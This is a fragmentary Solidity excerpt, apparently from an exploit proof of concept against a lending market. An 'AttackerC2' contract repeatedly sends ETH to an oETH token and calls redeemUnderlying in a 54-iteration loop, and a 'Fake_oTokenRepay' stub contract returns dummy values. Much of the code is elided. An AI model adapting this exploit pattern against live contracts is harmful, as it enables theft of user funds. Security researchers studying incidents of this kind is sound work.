...
contract AttackerC2 {
    ...
    function attack() external {
        ...
        (bool sucess,) = oETH.call{value: x}("");
        require(sucess, "Failed attack");

        for (uint256 i; i < 54; i++) {
            _oETH.exchangeRateStored(); // view
            _oETH.redeemUnderlying(y);
            _oETH.exchangeRateStored(); // view
            (bool sucess2,) = oETH.call{value: x}("");
            require(sucess2, "Failed attack");
        }
...
contract Fake_oTokenRepay {
    ...
    function liquidateBorrow(address, uint256, address) external pure returns (uint256) {
        return 0;
    }

    function mint(uint256) external pure returns (bool) {
        return false;
    }
